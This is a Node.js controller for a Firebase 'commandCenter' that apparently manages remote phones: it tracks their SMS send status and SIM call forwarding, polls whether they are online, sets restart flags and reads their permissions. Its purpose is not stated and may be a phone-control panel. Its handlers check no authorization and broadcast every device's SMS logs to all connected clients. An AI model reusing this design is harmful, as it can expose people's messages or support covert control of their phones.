import { rtdb } from "../config/db.js";

const ROOT = "commandCenter";

const smsWatchers = new Map();
const simWatchers = new Map();

function stopWatcher(map, uid) {
  if (map.has(uid)) {
    map.get(uid).off();
    map.delete(uid);
    console.log("🛑 Watcher stopped:", uid);
  }
}

function startSmsWatcher(uid, io) {
  const ref = rtdb.ref(`${ROOT}/smsStatus/${uid}`);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      io.emit("smsStatusUpdate", {
        uid,
        success: true,
        data: [],
        message: "No SMS logs found",
      });
      return;
    }

    const raw = snap.val();
    const list = [];

    Object.entries(raw).forEach(([smsId, obj]) => {
      list.push({
        smsId,
        uid,
        ...obj,
      });
    });

    list.sort((a, b) => b.at - a.at);

    io.emit("smsStatusUpdate", {
      uid,
      success: true,
      data: list,
    });

    console.log("📡 LIVE SMS STATUS →", uid);
  });

  smsWatchers.set(uid, ref);
  console.log("🎧 SMS watcher active:", uid);
}

function startSimWatcher(uid, io) {
  const ref = rtdb.ref(`simForwardStatus/${uid}`);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      io.emit("simForwardUpdate", {
        uid,
        success: true,
        data: [],
        message: "No SIM forward status found",
      });
      return;
    }

    const raw = snap.val();
    const list = [];

    Object.entries(raw).forEach(([slot, obj]) => {
      list.push({
        simSlot: Number(slot),
        ...obj,
      });
    });

    list.sort((a, b) => b.updatedAt - a.updatedAt);

    io.emit("simForwardUpdate", {
      uid,
      success: true,
      data: list,
    });

    console.log("📡 LIVE SIM FORWARD →", uid);
  });

  simWatchers.set(uid, ref);
  console.log("🎧 SIM watcher active:", uid);
}

export const getSmsStatusByDevice = async (req, res) => {
  try {
    const { uid } = req.params;
    const io = req.app.get("io");

    stopWatcher(smsWatchers, uid);

    const snap = await rtdb.ref(`${ROOT}/smsStatus/${uid}`).get();
    let list = [];

    if (snap.exists()) {
      Object.entries(snap.val()).forEach(([smsId, obj]) =>
        list.push({ smsId, uid, ...obj })
      );
      list.sort((a, b) => b.at - a.at);
    }

    startSmsWatcher(uid, io);

    return res.json({
      success: true,
      data: list,
      message: "Live SMS status listening started",
    });

  } catch (err) {
    console.error("❌ getSmsStatusByDevice ERROR:", err);
    return res.status(500).json({ success: false });
  }
};

export const getSimForwardStatus = async (req, res) => {
  try {
    const { uid } = req.params;
    const io = req.app.get("io");

    stopWatcher(simWatchers, uid);

    const snap = await rtdb.ref(`simForwardStatus/${uid}`).get();
    let list = [];

    if (snap.exists()) {
      Object.entries(snap.val()).forEach(([slot, obj]) =>
        list.push({
          simSlot: Number(slot),
          ...obj,
        })
      );
      list.sort((a, b) => b.updatedAt - a.updatedAt);
    }

    startSimWatcher(uid, io);

    return res.json({
      success: true,
      data: list,
      message: "Live SIM forward listening started",
    });

  } catch (err) {
    console.error("❌ getSimForwardStatus ERROR:", err);
    return res.status(500).json({ success: false });
  }
};

// ⭐ YAHAN PE CHANGE HUA HAI - saveCheckOnlineStatus
export const saveCheckOnlineStatus = async (req, res) => {
  try {
    const { uid } = req.params;
    const { available } = req.body;

    const checkedAt = Date.now();
    
    // Pehle se data check karo
    const existingSnap = await rtdb.ref(`checkOnline/${uid}`).get();
    const existingData = existingSnap.exists() ? existingSnap.val() : {};
    
    // lastSeen sirf tab update karo jab available "device is online" ho
    let lastSeen = existingData.lastSeen || null;
    
    const isOnline = available && available.toLowerCase().includes("device is online");
    
    if (isOnline) {
      // Agar online hai to lastSeen update karo
      lastSeen = checkedAt;
      console.log(`✅ ${uid}: Device is ONLINE, lastSeen updated to ${new Date(lastSeen).toLocaleString()}`);
    } else {
      // Agar offline hai to lastSeen mat badlo
      console.log(`❌ ${uid}: Device is OFFLINE, lastSeen not updated`);
    }
    
    const data = {
      available: available || "checking",
      checkedAt, // ✅ checkedAt hamesha update hoga
      lastSeen,  // ✅ lastSeen sirf online par update hoga
    };

    await rtdb.ref(`checkOnline/${uid}`).set(data);

    return res.json({
      success: true,
      message: "Check Online Updated",
      data: { uid, ...data },
    });

  } catch (err) {
    console.error("❌ saveCheckOnlineStatus ERROR:", err);
    return res.status(500).json({ success: false });
  }
};

// ⭐ YAHAN PE CHANGE HUA HAI - getAllBrosReplies
export const getAllBrosReplies = async (req, res) => {
  try {
    console.log("📡 [GET] /api/brosreply-all called");
    
    const snap = await rtdb.ref(`checkOnline`).get();
    const data = snap.exists() ? snap.val() : null;
    
    console.log("📡 Raw checkOnline data from Firebase:", data);

    const now = Date.now();
    const fifteenMinutesAgo = now - (15 * 60 * 1000);
    
    const activeDevices = {};
    let activeCount = 0;
    
    if (data && typeof data === 'object') {
      Object.entries(data).forEach(([uid, deviceData]) => {
        if (!deviceData || typeof deviceData !== 'object') {
          console.log(`❌ ${uid}: Invalid device data`);
          return;
        }
        
        // ✅ checkedAt hamesha hota hai
        const checkedAt = deviceData.checkedAt || 0;
        // ✅ lastSeen sirf online par set hota hai
        const lastSeen = deviceData.lastSeen || 0;
        const available = String(deviceData.available || "").toLowerCase().trim();
        
        console.log(`📊 ${uid}: available="${available}", checkedAt=${checkedAt}, lastSeen=${lastSeen}`);
        
        const isOnline = available.includes("device is online");
        
        // 15 minute ke andar ka online device
        const isRecent = Number(checkedAt) > fifteenMinutesAgo;
        
        if (isOnline && isRecent) {
          activeDevices[uid] = { 
            uid, 
            ...deviceData,
            checkedAt,  // ✅ checkedAt show karo
            lastSeen,   // ✅ lastSeen show karo
            isActive: true
          };
          activeCount++;
          console.log(`✅ ADDED ${uid} to active devices`);
        } else {
          console.log(`❌ SKIPPED ${uid}: isOnline=${isOnline}, isRecent=${isRecent}`);
        }
      });
    }

    console.log(`📊 Final result: ${activeCount} active devices`);
    
    return res.json({
      success: true,
      data: activeDevices,
      count: activeCount,
      timestamp: now,
      fifteenMinutesAgo: fifteenMinutesAgo,
      message: `Found ${activeCount} active devices in last 15 minutes`
    });

  } catch (err) {
    console.error("❌ getAllBrosReplies ERROR:", err);
    return res.status(500).json({ 
      success: false, 
      message: "Internal server error",
      error: err.message 
    });
  }
};

// ⭐ YAHAN PE CHANGE HUA HAI - getBrosReply
export const getBrosReply = async (req, res) => {
  try {
    const { uid } = req.params;

    const snap = await rtdb.ref(`checkOnline/${uid}`).get();
    const data = snap.exists() ? snap.val() : null;

    // Data ko transform karo taaki dono fields clearly dikhein
    const responseData = data ? { 
      uid, 
      ...data,
      // Ensure fields exist
      checkedAt: data.checkedAt || null,
      lastSeen: data.lastSeen || null,
      available: data.available || "unknown"
    } : null;

    return res.json({
      success: true,
      data: responseData,
    });

  } catch (err) {
    console.error("❌ getBrosReply ERROR:", err);
    return res.status(500).json({ success: false });
  }
};

export const setRestart = async (req, res) => {
  try {
    const { uid } = req.params;

    const at = Date.now();
    const data = {
      requested: true,
      at,
    };

    await rtdb.ref(`restartCollection/${uid}`).set(data);

    return res.json({
      success: true,
      data: { uid, ...data },
    });

  } catch (err) {
    console.error("❌ setRestart ERROR:", err);
    return res.status(500).json({ success: false });
  }
};

export const getDevicePermissions = async (req, res) => {
  try {
    const { uid } = req.params;

    const snap = await rtdb.ref(`registeredDevices/${uid}/permissions`).get();
    const data = snap.exists() ? snap.val() : null;

    return res.json({
      success: true,
      data: data ? { uid, ...data } : null,
      message: data ? "Permissions fetched successfully" : "No permissions found for this device",
    });

  } catch (err) {
    console.error("❌ getDevicePermissions ERROR:", err);
    return res.status(500).json({ success: false });
  }
};

export const getRestart = async (req, res) => {
  try {
    const { uid } = req.params;

    const snap = await rtdb.ref(`restartCollection/${uid}`).get();
    const data = snap.exists() ? snap.val() : null;

    return res.json({
      success: true,
      data: data ? { uid, ...data } : null,
    });

  } catch (err) {
    console.error("❌ getRestart ERROR:", err);
    return res.status(500).json({ success: false });
  }
};